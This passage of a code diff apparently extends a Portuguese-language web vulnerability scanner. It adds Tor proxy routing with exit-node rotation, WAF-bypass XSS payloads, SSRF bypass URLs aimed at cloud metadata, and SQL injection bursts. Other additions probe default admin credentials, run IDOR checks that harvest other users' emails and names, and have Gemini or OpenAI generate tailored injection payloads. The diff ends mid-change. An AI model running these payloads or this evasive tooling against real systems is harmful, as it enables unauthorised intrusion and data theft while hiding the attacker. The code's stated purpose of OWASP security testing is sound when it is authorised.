+        _res = _dr.Resolver()
+        _res.timeout = 2.0
+        _res.lifetime = 3.0
+        try:
+            answers = _res.resolve(domain, "CNAME")
+            for rdata in answers:
+                cname = str(rdata.target).lower().rstrip(".")
+                for pattern, provider in _dns_hosting_map.items():
+                    if cname.endswith(pattern):
+                        detected.append((provider, f"CNAME:{cname}"))
+        except Exception:
+            pass
+    except ImportError:
+        pass
+    return detected
+
+
+def _detect_tls_issuer(hostname):
+    """Detect hosting/CDN from TLS certificate issuer."""
+    _issuer_map = {
+        "Let's Encrypt": "Let's Encrypt",
+        "DigiCert": "DigiCert",
+        "Cloudflare": "Cloudflare",
+        "Amazon": "AWS",
+        "Google Trust": "Google Cloud",
+        "Sectigo": "Sectigo",
+        "GlobalSign": "GlobalSign",
+    }
+    try:
+        import ssl
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
+            s.settimeout(5)
+            s.connect((hostname, 443))
+            cert = s.getpeercert(binary_form=True)
+            if cert:
+                from cryptography import x509
+                c = x509.load_der_x509_certificate(cert)
+                issuer_str = c.issuer.rfc4514_string()
+                for pattern, provider in _issuer_map.items():
+                    if pattern.lower() in issuer_str.lower():
+                        return provider, issuer_str[:80]
+    except Exception:
+        pass
+    return None, ""
 
 
 # =============================================================================
@@ -1589,6 +2020,7 @@ BINARYEDGE_API_KEY     = os.getenv("BINARYEDGE_API_KEY", "")
 NVD_API_KEY            = os.getenv("NVD_API_KEY", "")
 VULNERS_API_KEY        = os.getenv("VULNERS_API_KEY", "")
 GEMINI_API_KEY         = os.getenv("GEMINI_API_KEY", "") or os.getenv("GEMINI-API", "")
+OPENAI_API_KEY         = os.getenv("OPENAI_API_KEY", "")
 
 # ── Gemini helper — análise inteligente pós-scan ──────────────────────────────
 def _call_gemini(prompt: str) -> str:
@@ -1649,6 +2081,46 @@ _rate_backoff = 0   # segundos de pausa atual
 # Cookies de sessão autenticada — preenchido pelo AuthenticatedCrawler se o
 # usuário fornecer credenciais. Injetado automaticamente em safe_get()/safe_head().
 _auth_cookies = {}
+_auth_header = ""   # --auth-header "Bearer TOKEN" — injected in all requests
+
+# ── Tor SOCKS5 proxy support (--tor) ─────────────────────────────────────────
+_TOR_MODE = False
+_TOR_PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
+_TOR_REQUEST_COUNT = 0
+
+def _check_tor_running():
+    """Verify Tor is running and accessible."""
+    try:
+        r = requests.get("https://check.torproject.org/api/ip",
+                         proxies={"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"},
+                         timeout=15, verify=False)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("IsTor"):
+                print(f"  {Fore.GREEN}[TOR] Conectado via Tor. IP: {data.get('IP')}{Style.RESET_ALL}")
+                return True
+    except Exception:
+        pass
+    print(f"  {Fore.RED}[TOR] Tor não acessível em 127.0.0.1:9050{Style.RESET_ALL}")
+    print(f"  {Fore.YELLOW}[TOR] Instale: sudo apt install tor && sudo systemctl start tor{Style.RESET_ALL}")
+    return False
+
+def _refresh_tor_circuit():
+    """Send NEWNYM signal to Tor control port for new exit node."""
+    try:
+        import socket as _sock
+        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+        s.settimeout(3)
+        s.connect(("127.0.0.1", 9051))
+        s.send(b'AUTHENTICATE ""\r\n')
+        s.recv(128)
+        s.send(b"SIGNAL NEWNYM\r\n")
+        resp = s.recv(128)
+        s.close()
+        if b"250" in resp:
+            time.sleep(1)
+    except Exception:
+        pass
 
 # Evento global de cancelamento — setado pelo Ctrl+C via signal handler
 _cancel_event = threading.Event()
@@ -1762,17 +2234,26 @@ def _load_checkpoint(path):
 def safe_get(url, params=None, headers=None, timeout=DEFAULT_TIMEOUT,
              allow_redirects=True, data=None, method="GET"):
     _stealth_delay()
+    global _TOR_REQUEST_COUNT
+    if _TOR_MODE:
+        _TOR_REQUEST_COUNT += 1
+        if _TOR_REQUEST_COUNT % 50 == 0:
+            _refresh_tor_circuit()
+    _proxies = _TOR_PROXIES if _TOR_MODE else PROXIES
     try:
         h = {**HEADERS_BASE, **(headers or {})}
+        if _auth_header:
+            h["Authorization"] = _auth_header
         ck = _auth_cookies or None
         if method == "POST":
             r = requests.post(url, data=data, params=params, headers=h,
                               timeout=timeout, verify=False,
-                              allow_redirects=allow_redirects, cookies=ck)
+                              allow_redirects=allow_redirects, cookies=ck,
+                              proxies=_proxies)
         else:
             r = requests.get(url, params=params, headers=h, timeout=timeout,
                              verify=False, allow_redirects=allow_redirects,
-                             cookies=ck)
+                             cookies=ck, proxies=_proxies)
         return r
     except Exception:
         return None
@@ -1898,7 +2379,12 @@ def adaptive_request(url, **kwargs):
     429 → pausa exponencial; voltar quando servidor liberar.
     """
     _stealth_delay()
-    global _rate_backoff
+    global _rate_backoff, _TOR_REQUEST_COUNT
+    if _TOR_MODE:
+        _TOR_REQUEST_COUNT += 1
+        if _TOR_REQUEST_COUNT % 50 == 0:
+            _refresh_tor_circuit()
+    _proxies = _TOR_PROXIES if _TOR_MODE else PROXIES
     _rate_pause.wait()
     time.sleep(BASE_DELAY + random.uniform(0, 0.3))
     try:
@@ -1907,10 +2393,10 @@ def adaptive_request(url, **kwargs):
         method  = kwargs.pop("method", "GET").upper()
         if method == "POST":
             r = requests.post(url, headers=headers, timeout=timeout,
-                              verify=False, proxies=PROXIES, **kwargs)
+                              verify=False, proxies=_proxies, **kwargs)
         else:
             r = requests.get(url, headers=headers, timeout=timeout,
-                             verify=False, proxies=PROXIES, **kwargs)
+                             verify=False, proxies=_proxies, **kwargs)
         if r.status_code == 429:
             _rate_backoff = min((_rate_backoff or 5) * 2, 120)
             log(f"  {Fore.RED}[RATE-LIMIT] 429 em {url[:60]} — pausando {_rate_backoff}s{Style.RESET_ALL}")
@@ -3470,13 +3956,86 @@ class ReconEngine:
         # Apenas Alta Prioridade — descartados são ignorados
         priority_targets = self.fuzzing_urls or [self.target_url]
 
+        # ── Baseline Fingerprint (anti-soft-404) ────────────────────────────
+        # Captura a "impressão digital" da página 404/redirect de cada target
+        # para filtrar soft-404s que redirecionam pro home ou retornam 200 genérico
+        _baselines = {}   # base_url → {status, size, hash, redirect, title}
+        _404_keywords = re.compile(
+            r'(?i)(not\s*found|404|page\s*(not|doesn.t)\s*(found|exist)|'
+            r'p[aá]gina\s*n[ãa]o\s*(encontrada|existe)|error|'
+            r'does\s*not\s*exist|no\s*existe|n[ãa]o\s*encontrad)',
+        )
+        _canary_path = "/cyberdyne_404_baseline_xk9m2p7q"
+
+        log(f"  {Fore.CYAN}[Baseline] Capturando fingerprint de soft-404 para {len(priority_targets)} targets...{Style.RESET_ALL}")
+        for _bt in priority_targets[:20]:
+            _bt_clean = _bt.rstrip("/")
+            try:
+                _br = requests.get(
+                    _bt_clean + _canary_path,
+                    headers=HEADERS_BASE, timeout=8, verify=False,
+                    allow_redirects=True, cookies=_auth_cookies or None
+                )
+                _body = _br.text[:10000]
+                _title_m = re.search(r'<title[^>]*>(.*?)</title>', _body, re.I | re.S)
+                _baselines[_bt_clean] = {
+                    "status": _br.status_code,
+                    "size": len(_br.text),
+                    "hash": hashlib.md5(_body.encode(errors="ignore")).hexdigest(),
+                    "redirect": _br.url if _br.url != (_bt_clean + _canary_path) else "",
+                    "title": _title_m.group(1).strip()[:80] if _title_m else "",
+                }
+            except Exception:
+                _baselines[_bt_clean] = {"status": 0, "size": 0, "hash": "", "redirect": "", "title": ""}
+        _soft404_filtered = [0]
+
+        def _is_soft_404(base, r):
+            """Retorna True se a response é um soft-404 (mesma página que o baseline)."""
+            bl = _baselines.get(base.rstrip("/"))
+            if not bl or not bl["hash"]:
+                return False
+
+            _body = r.text[:10000]
+            _resp_hash = hashlib.md5(_body.encode(errors="ignore")).hexdigest()
+
+            # Critério 1: hash idêntico ao baseline (mesma página exata)
+            if _resp_hash == bl["hash"]:
+                return True
+
+            # Critério 2: tamanho muito similar (±150 bytes) + mesmo status
+            if r.status_code == bl["status"] and abs(len(r.text) - bl["size"]) < 150:
+                return True
+
+            # Critério 3: redirect pra mesma URL que o baseline
+            if bl["redirect"] and r.url == bl["redirect"]:
+                return True
+
+            # Critério 4: mesmo título que o baseline
+            if bl["title"]:
+                _title_m = re.search(r'<title[^>]*>(.*?)</title>', _body, re.I | re.S)
+                if _title_m and _title_m.group(1).strip()[:80] == bl["title"]:
+                    # Mesmo título + tamanho similar = soft-404
+                    if abs(len(r.text) - bl["size"]) < 500:
+                        return True
+
+            return False
+
         def fuzz_one(base, path):
             url = base.rstrip("/") + path
             r   = adaptive_request(url, timeout=5)
-            if r and r.status_code not in (404, 410):
-                with lock:
-                    found_paths[url] = r.status_code
-                print(f"\r{' '*110}\r  {Fore.YELLOW}[FUZZ] {url} [{r.status_code}]{Style.RESET_ALL}", flush=True)
+            if not r or r.status_code in (404, 410):
+                return
+            # Filtrar soft-404
+            if _is_soft_404(base, r):
+                _soft404_filtered[0] += 1
+                return
+            # Filtrar respostas com keywords de 404
+            if r.status_code == 200 and _404_keywords.search(r.text[:500]):
+                _soft404_filtered[0] += 1
+                return
+            with lock:
+                found_paths[url] = r.status_code
+            print(f"\r{' '*110}\r  {Fore.YELLOW}[FUZZ] {url} [{r.status_code}]{Style.RESET_ALL}", flush=True)
 
         tasks = [(b, p) for b in priority_targets for p in sensitive]
         total = len(tasks)
@@ -3515,6 +4074,10 @@ class ReconEngine:
                 except Exception:
                     pass
         print(f"\r{' '*70}\r", end="", flush=True)
+
+        if _soft404_filtered[0] > 0:
+            log(f"  {Fore.CYAN}[Baseline] {_soft404_filtered[0]} soft-404 filtrados (redirect/catch-all){Style.RESET_ALL}")
+        log(f"  {Fore.GREEN}[FUZZ] {len(found_paths)} paths reais encontrados (de {total} testados){Style.RESET_ALL}")
 
         self._save_json("recon_fuzz_paths.json", found_paths)
         return found_paths
@@ -4223,10 +4786,15 @@ class VulnScanner:
 
         if _AI_PAYLOADS_MODE:
             _ctx_r = safe_get(self.target)
-            _ai_sqli = _ai_generate_payloads("SQL Injection", _ctx_r.text[:2000] if _ctx_r else "", self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_sqli = _ai_generate_payloads("SQL Injection", _ctx_html, self.target,
+                                              tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
             if _ai_sqli:
                 payloads = list(dict.fromkeys(payloads + _ai_sqli))
-                log(f"  {Fore.CYAN}[AI] +{len(_ai_sqli)} payloads SQLi contextuais do Gemini{Style.RESET_ALL}")
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_sqli)} payloads SQLi contextuais (Gemini/OpenAI){Style.RESET_ALL}")
 
         vuln_urls = []
         for url in self._get_urls_with_params() or [self.target + "?id=1"]:
@@ -4520,14 +5088,34 @@ class VulnScanner:
                     if any(t in p.lower() for t in ["<script", "onerror", "onload", "alert", "svg", "iframe"])]
         HTML_PAYLOADS = list(dict.fromkeys(HTML_PAYLOADS + _xss_extra + _naughty))
 
-        # AI Payloads — Gemini contextuais
+        # ── Mutation XSS — WAF bypass encodings ──────────────────────────────
+        _mutation_payloads = [
+            '%3Cscript%3Ealert(1)%3C/script%3E',              # URL encoded
+            '%253Cscript%253Ealert(1)%253C/script%253E',        # Double URL encoded
+            '<scr\x00ipt>alert(1)</scr\x00ipt>',                # Null byte
+            '<sCrIpT>alert(1)</sCrIpT>',                        # Case alternation
+            '<script>al\u0065rt(1)</script>',                    # Unicode escape
+            '<<script>alert(1)//',                               # Double open tag
+            '<script>alert`1`</script>',                         # Template literal
+            '<svg/onload=alert(1)>',                             # No space needed
+            '<img src=x onerror=alert(1)//',                     # Unclosed tag
+            '<body onload=alert(1)>',                            # Body event
+            '"><script>alert(String.fromCharCode(88,83,83))</script>',  # CharCode bypass
+        ]
+        HTML_PAYLOADS = list(dict.fromkeys(HTML_PAYLOADS + _mutation_payloads))
+
+        # AI Payloads — Gemini/OpenAI contextuais
         if _AI_PAYLOADS_MODE:
             _ctx_r = safe_get(self.target)
-            _ctx_html = _ctx_r.text[:2000] if _ctx_r else ""
-            _ai_xss = _ai_generate_payloads("XSS (Cross-Site Scripting)", _ctx_html, self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_xss = _ai_generate_payloads("XSS (Cross-Site Scripting)", _ctx_html, self.target,
+                                             tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
             if _ai_xss:
                 HTML_PAYLOADS = list(dict.fromkeys(HTML_PAYLOADS + _ai_xss))
-                log(f"  {Fore.CYAN}[AI] +{len(_ai_xss)} payloads XSS contextuais do Gemini{Style.RESET_ALL}")
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_xss)} payloads XSS contextuais (Gemini/OpenAI){Style.RESET_ALL}")
 
         ATTR_PAYLOADS = [
             '" onmouseover="alert(1)', "' onmouseover='alert(1)",
@@ -5059,11 +5647,44 @@ class VulnScanner:
                     vuln = True
                     evidence = f"Formulário POST sem token CSRF detectado em {page_url}"
                     break
+                # ── Token validation test: token exists but is it enforced? ──
+                if has_post and has_token and not vuln:
+                    # Extract form action
+                    action_m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', r.text, re.I)
+                    form_action = urljoin(page_url, action_m.group(1)) if action_m else page_url
+                    # Extract all hidden/input fields
+                    form_data = {}
+                    for inp in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', form, re.I):
+                        form_data[inp.group(1)] = inp.group(2)
+                    # Test 1: Submit WITHOUT token
+                    data_no_token = {k: v for k, v in form_data.items()
+                                     if not re.search(r'csrf|_token|authenticity_token|nonce', k, re.I)}
+                    r_no_token = safe_get(form_action, data=urlencode(data_no_token), method="POST",
+                                          headers={**HEADERS_BASE, "Content-Type": "application/x-www-form-urlencoded"},
+                                          timeout=8)
+                    # Test 2: Submit WITH invalid/modified token
+                    data_bad_token = dict(form_data)
+                    for k in data_bad_token:
+                        if re.search(r'csrf|_token|authenticity_token|nonce', k, re.I):
+                            data_bad_token[k] = "INVALID_TOKEN_" + str(random.randint(100000, 999999))
+                    r_bad_token = safe_get(form_action, data=urlencode(data_bad_token), method="POST",
+                                           headers={**HEADERS_BASE, "Content-Type": "application/x-www-form-urlencoded"},
+                                           timeout=8)
+                    # If both accepted (200 OK, no error indicators) => token NOT validated
+                    no_token_ok = (r_no_token and r_no_token.status_code in (200, 302)
+                                   and not any(e in r_no_token.text.lower() for e in ["csrf", "invalid token", "forbidden", "403"]))
+                    bad_token_ok = (r_bad_token and r_bad_token.status_code in (200, 302)
+                                    and not any(e in r_bad_token.text.lower() for e in ["csrf", "invalid token", "forbidden", "403"]))
+                    if no_token_ok and bad_token_ok:
+                        vuln = True
+                        evidence = (f"Token presente mas NÃO validado — request aceito sem token "
+                                    f"e com token inválido em {page_url}")
+                        break
         status = "VULNERAVEL" if vuln else "SEGURO"
         self._add(6,"CSRF","OWASP","ALTO",status,
                   evidence=evidence,
-                  recommendation="Implementar tokens CSRF em todos os formulários POST.",
-                  technique="Verificar ausência de token CSRF; forjar requisição cross-origin")
+                  recommendation="Implementar tokens CSRF em todos os formulários POST; validar token server-side.",
+                  technique="Verificar ausência de token CSRF; testar submissão sem token e com token inválido")
 
     def check_idor(self):
         idor_patterns = [r'/user[s]?/(\d+)', r'/account[s]?/(\d+)', r'/order[s]?/(\d+)',
@@ -5076,17 +5697,57 @@ class VulnScanner:
             if m:
                 found.append(m.group(0))
         if found:
-            test_url = re.sub(r'\d+', str(int(re.search(r'\d+', found[0]).group()) + 1), found[0])
-            r = safe_get(urljoin(self.target, test_url))
+            orig_id = int(re.search(r'\d+', found[0]).group())
+            # ── Baseline: fetch original ID ──
+            baseline_url = urljoin(self.target, found[0])
+            r_baseline = safe_get(baseline_url, timeout=8)
+            baseline_len = len(r_baseline.text) if r_baseline else 0
+            baseline_body = r_baseline.text if r_baseline else ""
+            # ── Fetch incremented ID ──
+            test_url = re.sub(r'\d+', str(orig_id + 1), found[0])
+            r = safe_get(urljoin(self.target, test_url), timeout=8)
             if r and r.status_code == 200:
-                self._add(7,"IDOR","OWASP","CRITICO","VULNERAVEL",
-                          url=urljoin(self.target, test_url),
-                          evidence=f"URL: {urljoin(self.target, test_url)} | Acesso sem auth ao recurso com ID incrementado",
-                          recommendation="Verificar ownership de objetos em cada request.",
-                          technique="Incrementar IDs em endpoints; trocar GUID de outro user")
-                return
+                # ── Content comparison: detect different user data ──
+                _user_data_patterns = [
+                    r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # email
+                    r'"name"\s*:\s*"([^"]+)"',                            # name field
+                    r'"username"\s*:\s*"([^"]+)"',                        # username
+                    r'"full_?name"\s*:\s*"([^"]+)"',                      # fullname
+                    r'"phone"\s*:\s*"([^"]+)"',                           # phone
+                ]
+                baseline_matches = set()
+                test_matches = set()
+                for pat in _user_data_patterns:
+                    for m in re.finditer(pat, baseline_body, re.I):
+                        baseline_matches.add(m.group(0).lower())
+                    for m in re.finditer(pat, r.text, re.I):
+                        test_matches.add(m.group(0).lower())
+                # IDOR confirmed if: different user-specific content found
+                has_diff_content = (test_matches and baseline_matches and test_matches != baseline_matches)
+                len_diff = abs(len(r.text) - baseline_len)
+                content_similar = (baseline_len > 0 and len_diff < baseline_len * 0.1)
+                if has_diff_content:
+                    diff_items = test_matches - baseline_matches
+                    self._add(7,"IDOR","OWASP","CRITICO","VULNERAVEL",
+                              url=urljoin(self.target, test_url),
+                              evidence=(f"URL: {urljoin(self.target, test_url)} | "
+                                        f"Dados diferentes entre id={orig_id} e id={orig_id+1}: "
+                                        f"{', '.join(list(diff_items)[:3])}"),
+                              recommendation="Verificar ownership de objetos em cada request.",
+                              technique="Incrementar IDs; comparar conteúdo (email/nome) entre respostas")
+                    return
+                elif not content_similar or len(r.text) > 100:
+                    # Fallback: status 200 + non-trivial body = possible IDOR
+                    self._add(7,"IDOR","OWASP","CRITICO","VULNERAVEL",
+                              url=urljoin(self.target, test_url),
+                              evidence=(f"URL: {urljoin(self.target, test_url)} | "
+                                        f"Acesso sem auth ao recurso com ID incrementado "
+                                        f"(body {len(r.text)}B vs baseline {baseline_len}B)"),
+                              recommendation="Verificar ownership de objetos em cada request.",
+                              technique="Incrementar IDs em endpoints; comparar body length e conteúdo")
+                    return
         self._add(7,"IDOR","OWASP","CRITICO","SEGURO",
-                  technique="Incrementar IDs em endpoints; trocar GUID de outro user")
+                  technique="Incrementar IDs em endpoints; comparar body length e conteúdo")
 
     def check_lfi(self):
         payloads = (_load_payload("LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt", 40) or
@@ -5095,9 +5756,15 @@ class VulnScanner:
         indicators = ["root:x:0","bin:x:1","daemon:x:","www-data","nobody:x"]
         if _AI_PAYLOADS_MODE:
             _ctx_r = safe_get(self.target)
-            _ai_lfi = _ai_generate_payloads("LFI (Local File Inclusion) / Path Traversal", _ctx_r.text[:2000] if _ctx_r else "", self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_lfi = _ai_generate_payloads("LFI (Local File Inclusion) / Path Traversal", _ctx_html, self.target,
+                                             tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
             if _ai_lfi:
                 payloads = list(dict.fromkeys(payloads + _ai_lfi))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_lfi)} payloads LFI contextuais (Gemini/OpenAI){Style.RESET_ALL}")
         for url in self._get_urls_with_params() or []:
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
@@ -5198,9 +5865,15 @@ class VulnScanner:
         indicators = ["uid=","root","www-data","nobody"]
         if _AI_PAYLOADS_MODE:
             _ctx_r = safe_get(self.target)
-            _ai_cmd = _ai_generate_payloads("Command Injection / RCE", _ctx_r.text[:2000] if _ctx_r else "", self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_cmd = _ai_generate_payloads("Command Injection / RCE", _ctx_html, self.target,
+                                             tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
             if _ai_cmd:
                 payloads = list(dict.fromkeys(payloads + _ai_cmd))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_cmd)} payloads CMD Injection contextuais (Gemini/OpenAI){Style.RESET_ALL}")
         for url in self._get_urls_with_params() or []:
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
@@ -5226,11 +5899,31 @@ class VulnScanner:
         # Augmentar com bypass headers do Payloads_CY (proxy inconsistencies)
         ssrf_payloads += [e for e in _load_payload("SSRF/reverse-proxy-inconsistencies.txt", 10)
                           if e.startswith("http")]
+        # ── SSRF bypass payloads: IPv6, hex/decimal/octal IP, DNS rebinding, cloud metadata ──
+        _ssrf_bypass = [
+            "http://[::1]/",                                     # IPv6 loopback
+            "http://[0:0:0:0:0:0:0:1]/",                        # IPv6 full
+            "http://[::ffff:169.254.169.254]/latest/meta-data/", # IPv6-mapped IPv4
+            "http://0x7f000001/",                                # Hex IP
+            "http://2130706433/",                                # Decimal IP
+            "http://017700000001/",                              # Octal IP
+            "http://0177.0.0.1/",                                # Octal octets
+            "http://169.254.169.254.xip.io/latest/meta-data/",   # DNS rebinding
+            "http://metadata.google.internal/computeMetadata/v1/",# GCP metadata
+            "http://169.254.169.254/metadata/v1/",                # Azure metadata (alt)
+        ]
+        ssrf_payloads = list(dict.fromkeys(ssrf_payloads + _ssrf_bypass))
         if _AI_PAYLOADS_MODE:
             _ctx_r = safe_get(self.target)
-            _ai_ssrf = _ai_generate_payloads("SSRF (Server-Side Request Forgery)", _ctx_r.text[:2000] if _ctx_r else "", self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_ssrf = _ai_generate_payloads("SSRF (Server-Side Request Forgery)", _ctx_html, self.target,
+                                              tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
             if _ai_ssrf:
                 ssrf_payloads = list(dict.fromkeys(ssrf_payloads + _ai_ssrf))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_ssrf)} payloads SSRF contextuais (Gemini/OpenAI){Style.RESET_ALL}")
         aws_indicators = ["ami-id","instance-id","instance-type","local-ipv4","security-credentials"]
         for url in self._get_urls_with_params() or []:
             parsed = urlparse(url)
@@ -5278,6 +5971,19 @@ class VulnScanner:
             "ami-id", "instance-id", "security-credentials",       # AWS metadata
         ]
         _b64_indicators = ["PD9waHA", "PCFET0NUWV", "aW5jbHVkZ"]  # base64 encoded PHP/HTML
+
+        # AI Payloads — Gemini/OpenAI contextuais
+        if _AI_PAYLOADS_MODE:
+            _ctx_r = safe_get(self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_xxe = _ai_generate_payloads("XXE (XML External Entity)", _ctx_html, self.target,
+                                             tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
+            if _ai_xxe:
+                xxe_payloads = list(dict.fromkeys(xxe_payloads + _ai_xxe))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_xxe)} payloads XXE contextuais (Gemini/OpenAI){Style.RESET_ALL}")
 
         headers = {**HEADERS_BASE, "Content-Type": "application/xml"}
         # Testar em endpoint principal e endpoints que aceitam XML
@@ -5384,15 +6090,49 @@ class VulnScanner:
                     if cookie_flags:
                         issues.append(f"Cookie '{ck.name}' {', '.join(cookie_flags)}")
 
+        # 4. Response comparison: valid vs invalid login produce same response?
+        if valid_login:
+            # Send invalid login
+            r_invalid = safe_get(valid_login,
+                                 data=json.dumps({"username": "definitely_not_a_user_xyz",
+                                                  "password": "wr0ng_p4ss_!@#$%^&*",
+                                                  "email": "definitely_not_a_user_xyz@fake.com"}),
+                                 method="POST",
+                                 headers={**HEADERS_BASE, "Content-Type": "application/json"},
+                                 timeout=5)
+            # Send potentially valid login (common admin)
+            r_valid = safe_get(valid_login,
+                               data=json.dumps({"username": "admin",
+                                                "password": "admin",
+                                                "email": "admin@admin.com"}),
+                               method="POST",
+                               headers={**HEADERS_BASE, "Content-Type": "application/json"},
+                               timeout=5)
+            if r_invalid and r_valid:
+                same_status = (r_invalid.status_code == r_valid.status_code)
+                size_diff = abs(len(r_valid.text) - len(r_invalid.text))
+                same_size = (size_diff < 50)
+                # Both redirect to same place?
+                same_redirect = (r_valid.url == r_invalid.url) if r_valid.is_redirect or r_invalid.is_redirect else True
+                if same_status and same_size and same_redirect and r_valid.status_code in (200, 302):
+                    # Check if valid login also got success keywords (shouldn't with wrong creds)
+                    valid_has_success = any(w in r_valid.text.lower() for w in
+                                           ["dashboard", "welcome", "token", "access_token", "logged", "success"])
+                    invalid_has_success = any(w in r_invalid.text.lower() for w in
+                                             ["dashboard", "welcome", "token", "access_token", "logged", "success"])
+                    if valid_has_success and invalid_has_success:
+                        issues.append(f"Login válido e inválido produzem mesma resposta "
+                                      f"(status {r_valid.status_code}, size ~{len(r_valid.text)}B) — potential auth bypass")
+
         if issues:
             self._add(13,"Broken Authentication / Session","OWASP","CRITICO","VULNERAVEL",
                       url=valid_login if valid_login else self.target,
                       evidence=f"Endpoint: {valid_login or self.target} | {'; '.join(issues[:3])}",
-                      recommendation="Política de senhas forte; flags HttpOnly/Secure/SameSite nos cookies.",
-                      technique="Default credentials (10 pares) + cookie flags audit")
+                      recommendation="Política de senhas forte; flags HttpOnly/Secure/SameSite nos cookies; respostas diferentes para login válido/inválido.",
+                      technique="Default credentials (10 pares) + cookie flags audit + response comparison")
         else:
             self._add(13,"Broken Authentication / Session","OWASP","CRITICO","SEGURO",
-                      technique="Default credentials (10 pares) + cookie flags audit")
+                      technique="Default credentials (10 pares) + cookie flags audit + response comparison")
 
     def check_broken_access(self):
         admin_paths = ["/admin","/admin/users","/api/admin","/manage","/dashboard/admin",
@@ -6353,19 +7093,56 @@ class VulnScanner:
         # Tentar ações maliciosas e ver se há rate limit
         test_url = self.target + "/login"
         blocked = False
+        rate_limit_headers = False
         for _ in range(8):
             r = safe_get(test_url, data={"username":"test","password":"wrongpass"}, method="POST")
             if r and r.status_code in [429, 403]:
                 blocked = True
                 break
+
+        # ── Enhanced: Send 20 requests with SQL injection payload to detect monitoring ──
         if not blocked:
+            sqli_payload = "' OR 1=1 --"
+            sqli_blocked = False
+            sqli_rate_limited = False
+            test_endpoints = [self.target + "/login", self.target + "/search",
+                              self.target + "/api/login"]
+            for endpoint in test_endpoints:
+                for i in range(20):
+                    if _cancel_event.is_set():
+                        break
+                    r_sqli = safe_get(endpoint,
+                                      data=json.dumps({"username": sqli_payload, "password": sqli_payload,
+                                                       "q": sqli_payload, "search": sqli_payload}),
+                                      method="POST",
+                                      headers={**HEADERS_BASE, "Content-Type": "application/json"},
+                                      timeout=5)
+                    if r_sqli:
+                        if r_sqli.status_code == 429:
+                            sqli_rate_limited = True
+                            break
+                        if r_sqli.status_code == 403:
+                            sqli_blocked = True
+                            break
+                        # Check for rate-limit headers
+                        for h in r_sqli.headers:
+                            if "ratelimit" in h.lower() or "retry-after" in h.lower():
+                                rate_limit_headers = True
+                if sqli_rate_limited or sqli_blocked or rate_limit_headers:
+                    blocked = True
+                    break
+
+        if not blocked:
+            evidence_parts = ["8 tentativas de login sem bloqueio/rate-limit"]
+            if not rate_limit_headers:
+                evidence_parts.append("20 requests com payload SQLi sem rate-limit ou WAF block")
             self._add(19,"Insufficient Logging & Monitoring","OWASP","MEDIO","VULNERAVEL",
-                      evidence="8 tentativas de login sem bloqueio/rate-limit",
-                      recommendation="Implementar rate-limiting, logging centralizado e alertas de segurança.",
-                      technique="Verificar ausência de rate-limit em ações críticas")
+                      evidence=" | ".join(evidence_parts),
+                      recommendation="Implementar rate-limiting, logging centralizado, WAF e alertas de segurança.",
+                      technique="Verificar ausência de rate-limit em login + 20 requests com SQLi payload")
         else:
             self._add(19,"Insufficient Logging & Monitoring","OWASP","MEDIO","SEGURO",
-                      technique="Verificar ausência de rate-limit em ações críticas")
+                      technique="Verificar ausência de rate-limit em login + 20 requests com SQLi payload")
 
     def check_ssti(self):
         payloads = {"{{7*7}}":{"expect":"49"},"${7*7}":{"expect":"49"},
@@ -6377,11 +7154,20 @@ class VulnScanner:
                     payloads[_tp] = {"expect": "49"}
         if _AI_PAYLOADS_MODE:
             _ctx_r = safe_get(self.target)
-            _ai_ssti = _ai_generate_payloads("SSTI (Server-Side Template Injection)", _ctx_r.text[:2000] if _ctx_r else "", self.target)
